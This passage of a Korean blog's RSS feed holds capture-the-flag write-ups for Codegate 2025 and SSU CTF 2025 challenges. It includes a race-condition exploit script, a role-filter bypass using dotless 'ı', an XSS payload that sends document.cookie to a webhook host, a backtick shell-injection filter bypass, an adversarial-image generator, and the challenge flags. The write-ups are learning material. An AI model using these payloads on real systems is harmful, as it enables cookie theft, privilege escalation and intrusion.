+&lt;p&gt;&lt;code&gt;{ uid: &quot;admin&quot; }&lt;/code&gt; 넣고 base64 인코딩해서 어드민 토큰을 생성할 수 있다.&lt;/p&gt;
+&lt;p&gt;나머지 코드를 분석해보자.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/auth&lt;/code&gt;에서는 해시 값과 내 입력이 동일하다면 플래그를 준다.
+하지만 저 해시값을 예측하는 건 불가능하다.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;const storedData = await fs.promises.readFile(temporaryFileName, &quot;utf-8&quot;);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;위 코드를 봤을 때 &lt;code&gt;await fs.promises&lt;/code&gt;를 사용해파일을 비동기적으로 읽는다는 걸 알 수 있고 Race Condition이 가능해진다는걸 알 수 있다.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;import threading
+import requests
+
+def send_2fa():
+    requests.post(&quot;http://15.165.38.117:1234/2fa&quot;, cookies={&quot;check&quot;: &quot;test.eyJ1aWQiOiI4N2M4NjllNzI5NTY2M2YyYzAyNTFmYzMxMTUwZDBlMyJ9&quot;})
+
+def read_auth():
+    response = requests.post(&quot;http://15.165.38.117:1234/auth&quot;, cookies={&quot;check&quot;: &quot;test.eyJ1aWQiOiI4N2M4NjllNzI5NTY2M2YyYzAyNTFmYzMxMTUwZDBlMyJ9&quot;}, json={&quot;data&quot;: &quot;&quot;})
+    print(response.text)
+
+threading.Thread(target=send_2fa).start()
+threading.Thread(target=read_auth).start()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;익스코드는 위와 같다
+2fa를 보낸 후 파일에 해시값이 새로 쓰이기 전까지 잠깐의 텀이 생긴다
+그 사이에 auth로 빈 값 (&quot;&quot;)과 비교해 주면 플래그를 얻을 수 있다&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;codegate2025{8b2c743e13f766b30c9c1e72e8a6595a651321da1c01eda7776fbd8e209ef9feace5a162237e696ea4b58a7bdf0b88dfb7f25c5ac76f4e12a4c4538d438fcdbf}&lt;/code&gt;&lt;/p&gt;
+&lt;h3&gt;Masquerade&lt;/h3&gt;
+&lt;p&gt;업솔빙 때린 문제인데 인상깊어서 풀진 못했지만 적어본다. 못 푼 내가 할 말은 아니지만 주니어부 0솔까지 갈 문제는 아니었다고 생각한다&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./mar1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;비밀번호를 입력하면 uuid 하나를 만들어주는데 로그인 해보면 MEMBER 역할이 기본적으로 할당 되어있다.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;const puppeteer = require(&apos;puppeteer&apos;);
+const { generateToken } = require(&apos;./jwt&apos;)
+
+const delay = (ms) =&amp;gt; new Promise(resolve =&amp;gt; setTimeout(resolve, ms));
+
+const viewUrl = async (post_id) =&amp;gt; {
+    const token = generateToken({ uuid: &quot;codegate2025{test_flag}&quot;, role: &quot;ADMIN&quot;, hasPerm: true })
+
+    const cookies = [{ &quot;name&quot;: &quot;jwt&quot;, &quot;value&quot;: token, &quot;domain&quot;: &quot;localhost&quot; }];
+
+    const browser = await puppeteer.launch({
+        executablePath: &apos;/usr/bin/chromium&apos;,
+        args: [&quot;--no-sandbox&quot;]
+    });
+
+    let result = true;
+
+    try {
+        await browser.setCookie(...cookies);
+
+        const page = await browser.newPage();
+
+        await page.goto(`http://localhost:3000/post/${post_id}`, { timeout: 3000, waitUntil: &quot;domcontentloaded&quot; });
+
+        await delay(1000);
+
+        const button = await page.$(&apos;#delete&apos;);
+        await button.click();
+
+        await delay(1000);
+    } catch (error) {
+        console.error(&quot;An Error occurred:&quot;, error);
+        result = false;
+    } finally {
+        await browser.close();
+    }
+
+    return result;
+};
+
+module.exports = { viewUrl };
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;app.use((req, res, next) =&amp;gt; {
+  const nonce = crypto.randomBytes(16).toString(&apos;hex&apos;);
+
+  res.setHeader(&quot;X-Frame-Options&quot;, &quot;deny&quot;);
+
+  if (req.path.startsWith(&apos;/admin&apos;)) {
+    res.setHeader(&quot;Content-Security-Policy&quot;, `default-src &apos;self&apos;; script-src &apos;self&apos; &apos;unsafe-inline&apos;`);
+  } else {
+    res.setHeader(&quot;Content-Security-Policy&quot;, `default-src &apos;self&apos;; script-src &apos;nonce-${nonce}&apos;`);
+  }
+
+  res.locals.nonce = nonce;
+
+  next();
+});
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;코드에 봇이 있는걸로 봐서는 제공된 게시판에서 XSS를 일으켜야한다는걸 알 수 있지만 기본적으로 csp가 빡세게 걸려있다.
+따라서 /admin 경로에서 xss를 유도해야한다는걸 알 수 있다.&lt;/p&gt;
+&lt;p&gt;차근차근 분석해보자&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;const role_list = [&quot;ADMIN&quot;, &quot;MEMBER&quot;, &quot;INSPECTOR&quot;, &quot;DEV&quot;, &quot;BANNED&quot;];
+
+function checkRole(role) {
+    const regex = /^(ADMIN|INSPECTOR)$/i;
+    return regex.test(role);
+}
+
+const addUser = (password) =&amp;gt; {
+    const uuid = uuidv4()
+
+    users.set(uuid, { password, role: &quot;MEMBER&quot;, hasPerm: false });
+
+    return uuid;
+};
+
+const getUser = (uuid) =&amp;gt; {
+    return users.get(uuid);
+};
+
+const getUsers = () =&amp;gt; {
+    console.log(users);
+    return 1;
+};
+
+const setRole = (uuid, input) =&amp;gt; {
+    const user = getUser(uuid);
+
+    if (checkRole(input)) return false;
+    if (!role_list.includes(input.toUpperCase())) return false;
+
+    users.set(uuid, { ...user, role: input.toUpperCase() });
+
+    const updated = getUser(uuid);
+
+    const payload = { uuid, ...updated }
+
+    delete payload.password;
+
+    const token = generateToken(payload);
+
+    return token;
+};
+
+const setPerm = (uuid, input) =&amp;gt; {
+    const user = getUser(uuid);
+    console.log(uuid, { ...user, hasPerm: input })
+
+    console.log(user);
+
+    users.set(uuid, { ...user, hasPerm: input });
+
+    return true;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;ADMIN, MEMBER, INSPECTOR, DEV, BANNED 역할이 존재한다
+게시판 기능은 ADMIN만, 봇에게 report는 INSPECTOR만 할 수 있다.&lt;/p&gt;
+&lt;p&gt;입력한 역할이 ADMIN이나 INSPECTOR면 false를 리턴한다.
+하지만 &lt;code&gt;toUpperCase()&lt;/code&gt; 함수를 사용해 비교하고 있으므로 &lt;a href=&quot;https://lovflag.tistory.com/58&quot;&gt;Case Mapping Collision&lt;/a&gt;이 발생한다.&lt;/p&gt;
+&lt;p&gt;ı(U+0131)을 활용해 입력하면 필터링을 우회하고 두 역할을 얻을 수 있다.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./mar2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;어드민 권한 탈취 후 패널에서 쓰기 권한을 켜주면 게시판에 글을 쓸 수 있게된다.&lt;/p&gt;
+&lt;p&gt;(권한 바꾼 후 재로그인해야 권한이 정상적으로 적용된다. 이거 때문에 삽질 좀 했다)&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;const button = await page.$(&apos;#delete&apos;);
+await button.click();
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;봇이 &lt;code&gt;#delete&lt;/code&gt;를 클릭하는걸 활용해 XSS 할 수 있는데 클라이언트 단에서 dompurify가 막고 있다.&lt;/p&gt;
+&lt;p&gt;bypass하기 위해 방법을 찾던 중 로드해오는 js 중에 난독화 된 바이너리를 발견했고 복호화한 결과 아래와 같은 코드가 나왔다&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;if (!title &amp;amp;&amp;amp; !content) {
+    post_content.innerHTML = &quot;Usage: ?title=a&amp;amp;content=b&quot;;
+} else {
+    try {
+        post_title.innerHTML = DOMPurify.sanitize(title);
+        post_content.innerHTML = DOMPurify.sanitize(content);
+    } catch {
+        post_title.innerHTML = title;
+        post_content.innerHTML = content;
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;오류가 나면 그냥 title이랑 content를 그대로 innerHTML 해서 문제없이 xss가 가능해진다.&lt;/p&gt;
+&lt;p&gt;dompurify를 상대경로로 불러오고 있기에, &lt;code&gt;/admin/test/?title=a&amp;amp;content=(XSS_PAYLOAD)&lt;/code&gt;로 Open Redirect해서 RPO 터트려주면 된다.&lt;/p&gt;
+&lt;p&gt;정리하자면 Case mapping collision + RPO + XSS였다.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;area id=&quot;conf&quot;&amp;gt; &amp;lt;area id=&quot;conf&quot; name=&quot;deleteUrl&quot; href=&quot;/admin/test/?title=test&amp;amp;content=&amp;lt;img src=x onerror=&apos;location.href=`webhook.com?q=${document.cookie}`&apos;&amp;gt;&quot;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;출제자 payload - 문제시 삭제하겠습니다&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;주니어부 0솔까지 갈 정도로 어려웠던 문제는 아니었던거 같은데 0솔인건 좀 의문이다&lt;/p&gt;
+&lt;p&gt;확실히 CSP랑 dompurify에 대한 지식이 거의 없었어서 문제의도 파악이 어려웠던거 같다. 공부해야겠다&lt;/p&gt;
+</content:encoded></item><item><title>SSU CTF 2025 Write-Up</title><link>https://fuwari.vercel.app/posts/ssuctf/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/ssuctf/</guid><description>Overall 28th, General 17th</description><pubDate>Sun, 26 Jan 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;Comment&lt;/h2&gt;
+&lt;p&gt;어려웠다.. 웹에서 처음보는 기법들이 많이 나와서 손도 못댔다&lt;br /&gt;
+비교적 쉽게 나온 다른 분야 몇문제만 풀었다. 팀원들이 잘해줘서 생각보다 잘 나온거 같다.
+100점짜리 문제는 올솔브했다&lt;/p&gt;
+&lt;h2&gt;Solve&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Mazer (rev)&lt;/li&gt;
+&lt;li&gt;meme (misc)&lt;/li&gt;
+&lt;li&gt;compressor (misc)&lt;/li&gt;
+&lt;li&gt;ssu shell (pwn)&lt;/li&gt;
+&lt;li&gt;check the target (misc)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;Write-Up&lt;/h2&gt;
+&lt;h3&gt;Mazer&lt;/h3&gt;
+&lt;p&gt;딱봐도 불가능해보이는 미로게임을 풀어야한다.
+exe 파일이랑 이미지 에셋만 달랑 주길래 치트엔진으로 exe 조작해서 푸는거인가 싶었다.&lt;/p&gt;
+&lt;p&gt;근데 자세히 보니 exe에 파이썬 로고가 있었고 따라서 파이썬으로 작성된 게임이란 걸 알 수 있었다.
+pyinstxtractor를 사용해 pyc파일로 추출해주고 이를 다시 한 번 디컴파일해서 원문 python 코드를 얻을 수 있었다.&lt;/p&gt;
+&lt;p&gt;여기서 깃허브 툴 몇 개 써서 해보면 중간에 오류뜨는데 온라인 툴 중에 깔끔히 디컴 되는게 있었다. 디컴 안 되서 어셈블리 리버싱해서 푼 분도 있다고 하신다 ㄷㄷ...&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;import pygame
+import sys
+import random
+import hashlib
+
+def xor_image_hash(frog_path, wall_path, floor_path, statue_path):
+    hasher = hashlib.sha256()
+    with open(frog_path, &apos;rb&apos;) as f:
+        hasher.update(f.read())
+    with open(wall_path, &apos;rb&apos;) as f:
+        hasher.update(f.read())
+    with open(floor_path, &apos;rb&apos;) as f:
+        hasher.update(f.read())
+    with open(statue_path, &apos;rb&apos;) as f:
+        hasher.update(f.read())
+    return hasher.hexdigest()[:16]
+
+def make_flag():
+    frog_file = &apos;chill.jpeg&apos;
+    wall_file = &apos;wall.jpg&apos;
+    floor_file = &apos;tile.jpg&apos;
+    statue_file = &apos;flag.png&apos;
+    result = xor_image_hash(frog_file, wall_file, floor_file, statue_file)
+    flag = &apos;ssu{&apos; % result + &apos;}&apos;
+    return flag
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;make_flag()&lt;/code&gt;는 이미지의 해시값을 받아서 플래그로 리턴해준다&lt;/p&gt;
+&lt;p&gt;저부분만 때서 그대로 실행해주면 플래그를 얻을 수 있다&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;ssu{236501dfe16b611f}&lt;/code&gt;&lt;/p&gt;
+&lt;h3&gt;meme&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;contract Ssumeme {
+    address public owner;
+    string private flag;
+
+    constructor() {
+        owner = msg.sender;
+
+        uint256 blockHashPart = uint256(blockhash(block.number - 1)) % 1000000000;
+        flag = string(abi.encodePacked(&quot;ssu{&quot;, uint2str(blockHashPart), &quot;_m3m3}&quot;));
+    }
+
+    function getFlag() public view returns (string memory) {
+        require(msg.sender == owner, &quot;Only the contract owner can access the flag. Contact to soongsil.asc@gmail.com :)&quot;);
+        return flag;
+    }
+
+    function uint2str(uint256 _i) internal pure returns (string memory) {
+        if (_i == 0) {
+            return &quot;0&quot;;
+        }
+        uint256 j = _i;
+        uint256 length;
+        while (j != 0) {
+            length++;
+            j /= 10;
+        }
+        bytes memory bstr = new bytes(length);
+        uint256 k = length;
+        while (_i != 0) {
+            k = k - 1;
+            uint8 temp = (48 + uint8(_i - _i / 10 * 10));
+            bytes1 b1 = bytes1(temp);
+            bstr[k] = b1;
+            _i /= 10;
+        }
+        return string(bstr);
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Solidity라는 프로그래밍 언어인거 같은데 누가봐도 저 flag가 수상해보인다&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;block_hash = 0x3fd4e38b9b28cfe753436b3277eec250ffe435894957cc15ac493d864d1e0c29
+block_hash %= 1000000000
+print(block_hash)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;블록해시값 찾아서 넣은 다음에 계산 때려주면 된다&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;ssu{809209385_m3m3}&lt;/code&gt;&lt;/p&gt;
+&lt;h3&gt;compressor&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;import gzip
+import hashlib
+import os
+
+def main():
+    with open(__file__, &apos;r&apos;) as f:
+        print(f.read())
+
+    print(&apos;\n&apos;+&apos;=&apos;*50+&apos;\n&apos;)
+
+    data = input(&apos;Your gzip (hex) &amp;gt;&amp;gt;&amp;gt; &apos;)
+
+    try:
+        data = bytes.fromhex(data)
+        d_data = gzip.decompress(data)
+    except (ValueError, gzip.BadGzipFile):
+        print(&apos;Nah...&apos;)
+        exit()
+
+
+    origin_hash = hashlib.sha256(data).hexdigest()
+    print(f&apos;{origin_hash=}&apos;)
+    decomp_hash = hashlib.sha256(d_data).hexdigest()
+    print(f&apos;{decomp_hash=}&apos;)
+
+    if origin_hash == decomp_hash:
+        print(os.environ.get(&apos;FLAG&apos;, &apos;dummy_flag&apos;))
+
+if __name__ == &apos;__main__&apos;:
+    main()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;원래 data와 gzip으로 decompress한 데이터의 해시가 같으면 flag를 준다&lt;/p&gt;
+&lt;p&gt;아무것도 입력 안하면 두 해시가 같기에 그냥 엔터치면 나온다&lt;/p&gt;
+&lt;p&gt;원래 &lt;a href=&quot;https://github.com/Honno/gzip-quine/blob/main/quine.gz&quot;&gt;gzip-quine&lt;/a&gt;을 써서 푸는 문제였다고 한다. 문제에 검증이 빠져있어서 real compressor라는 리벤지 문제가 중간에 출제되었다 (이건 못풀었다)&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;ssu{have_you_heard_about_the_quine?}&lt;/code&gt;&lt;/p&gt;
+&lt;h3&gt;ssu shell&lt;/h3&gt;
+&lt;p&gt;받은 인풋을 그대로 echo 해주는 프로그램이다.&lt;/p&gt;
+&lt;p&gt;몇몇 문자열이 필터링 되기에 명령어를 치환해서 넣어야한다&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&apos;`cat ?lag_*`&apos;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;이렇게 써주면 플래그를 읽을 수 있다&lt;/p&gt;
+&lt;h3&gt;Check the target&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;import pickle
+import numpy as np
+import torch
+import torch.nn as nn
+import base64
+import io
+from PIL import Image
+import os
+
+class CustomModel(nn.Module):
+    def __init__(self):
+        super(CustomModel, self).__init__()
+        self.hidden1 = nn.Linear(784, 256)
+        self.hidden2 = nn.Linear(256, 128)
+        self.output = nn.Linear(128, 10)
+        with torch.no_grad():
+            self.hidden1.weight[0] = torch.ones(784)*0.1
+            self.hidden1.bias[0] = 0.1
+            self.hidden2.weight[0] = torch.ones(256)*0.2
+            self.hidden2.bias[0] = 0.2
+
+    def forward(self, x: torch.Tensor) -&amp;gt; torch.Tensor:
+        x = torch.relu(self.hidden1(x))
+        x = torch.relu(self.hidden2(x))
+        return torch.softmax(self.output(x), dim=1)
+
+def modelLoad(path):
+    model = CustomModel()
+    weights = torch.load(path)
+    model.load_state_dict(weights)
+    model = model.eval()
+    return model
+
+def preprocess(x:str) -&amp;gt; torch.Tensor:
+    image_data = base64.b64decode(x)
+    image = Image.open(io.BytesIO(image_data))
+    tensor = torch.tensor(np.array(image)).float().view(1, -1)
+    return tensor
+
+def predict(model, x):
+    with torch.no_grad():
+        out = model(x)
+        prediction = out.argmax().item()
+        confidence = out.max().item()
+
+    return out,prediction, confidence
+
+if __name__ == &quot;__main__&quot;:
+    model = modelLoad(&quot;weights.pkl&quot;)
+    x = input(&quot;[*] Enter the image data(base64): &quot;)
+    x = preprocess(x)
+    criterion = nn.CrossEntropyLoss()
+    out,prediction, confidence = predict(model, x)
+    loss = criterion(out, torch.tensor([7]))
+    max_length = max(
+            len(f&quot;Prediction : {prediction}&quot;),
+            len(f&quot;Confidence : {confidence}&quot;),
+            len(f&quot;Loss       : {loss.item()}&quot;),
+        )
+    print(&quot;╔&quot; + &quot;═&quot; * (max_length + 4) + &quot;╗&quot;)
+    print(f&quot;║  Prediction : {prediction:&amp;lt;{max_length - 13}}  ║&quot;)
+    print(f&quot;║  Confidence : {confidence:&amp;lt;{max_length - 13}}  ║&quot;)
+    print(f&quot;║  Loss       : {loss.item():&amp;lt;{max_length - 13}}  ║&quot;)
+    print(&quot;╚&quot; + &quot;═&quot; * (max_length + 4) + &quot;╝&quot;)
+
+    success = prediction == 7 and confidence &amp;gt; 0.98
+    if success:
+        print(&quot;[*] Success!&quot;, os.environ.get(&quot;FLAG&quot;, &apos;dummy_flag&apos;))
+    else:
+        print(&quot;[*] Failed!&quot;)
+        exit(1)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;이건 뭔가 이상한 언인텐이 있었는데 어떻게 푸는건지 모르겠다&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;import torch
+import numpy as np
+from PIL import Image
+import base64
+import io
+
+# 모델 초기화
+class CustomModel(torch.nn.Module):
+    def __init__(self):
+        super(CustomModel, self).__init__()
+        self.hidden1 = torch.nn.Linear(784, 256)
+        self.hidden2 = torch.nn.Linear(256, 128)
+        self.output = torch.nn.Linear(128, 10)
+
+    def forward(self, x: torch.Tensor) -&amp;gt; torch.Tensor:
+        x = torch.relu(self.hidden1(x))
+        x = torch.relu(self.hidden2(x))
+        return torch.softmax(self.output(x), dim=1)
+
+# 가중치 로드
+weights_path = &quot;weights.pkl&quot;
+weights = torch.load(weights_path, map_location=torch.device(&apos;cpu&apos;))
+
+# 모델 설정
+model = CustomModel()
+model.load_state_dict(weights)
+model.eval()
+
+# 조건을 만족하는 입력 데이터 생성
+def generate_input(model, target_class=7, confidence_threshold=0.98):
+    input_tensor = torch.rand(1, 784)  # 임의의 초기 입력값
+    input_tensor.requires_grad = True
+
+    optimizer = torch.optim.Adam([input_tensor], lr=0.1)
+
+    for _ in range(1000):  # 최대 1000번 반복
+        optimizer.zero_grad()
+        output = model(input_tensor)
+        confidence = output[0, target_class]
+        loss = -confidence  # 타겟 클래스의 확률을 최대화
+        loss.backward()
+        optimizer.step()
+
+        with torch.no_grad():
+            input_tensor.clamp_(0, 1)  # 이미지 데이터는 [0, 1] 범위로 제한
+
+        if confidence.item() &amp;gt; confidence_threshold:
+            print(f&quot;조건 만족: 클래스 {target_class}, 신뢰도 {confidence.item()}&quot;)
+            break
+
+    return input_tensor
+
+# 입력 데이터 생성
+input_data = generate_input(model)
+
+# 이미지로 변환
+image_array = (input_data.view(28, 28).detach().numpy() * 255).astype(np.uint8)
+image = Image.fromarray(image_array)
+image.save(&quot;generated_image.png&quot;)
+
+# 베이스64 인코딩
+buffer = io.BytesIO()
+image.save(buffer, format=&quot;PNG&quot;)
+base64_image = base64.b64encode(buffer.getvalue()).decode()
+
+print(f&quot;Base64 Encoded Image:\n{base64_image}&quot;)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;ssu{g04t_of_m0de1_4na1ys1s}&lt;/code&gt;&lt;/p&gt;
+</content:encoded></item></channel></rss>
